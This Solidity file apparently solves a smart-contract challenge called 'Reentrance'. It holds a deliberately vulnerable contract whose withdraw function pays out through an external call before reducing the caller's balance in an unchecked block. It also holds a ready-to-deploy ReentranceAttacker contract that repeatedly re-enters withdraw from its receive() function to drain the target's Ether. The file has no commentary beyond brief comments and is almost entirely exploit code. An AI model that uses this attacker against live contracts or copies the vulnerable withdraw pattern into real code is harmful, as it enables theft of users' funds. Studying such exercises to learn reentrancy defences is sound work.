// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{value: _amount}("");
      if (result) {
        _amount;
      }
      unchecked {
        balances[msg.sender] -= _amount;
      }
    }
  }

  receive() external payable {}
}

contract ReentranceAttacker {
  address public owner;
  Reentrance targetContract;
  uint donation;

  constructor(address payable _targetAddr) payable {
    targetContract = Reentrance(_targetAddr);
    owner = msg.sender;
  }

  // begin attack by depositing and withdrawing
  // when all functions return, we will transfer funds to owner
  function attack() public payable {
    donation = msg.value;
    targetContract.donate{value: donation}(address(this));
    targetContract.withdraw(donation);
  }

  // point of re-entry
  receive() external payable {
    uint targetBalance = address(targetContract).balance;
    if (targetBalance >= donation) {
      // withdraw at most your balance at a time
      targetContract.withdraw(donation);
    } else if (targetBalance > 0) {
      // withdraw the remaining balance in the contract
      targetContract.withdraw(targetBalance);
    }
  }
}
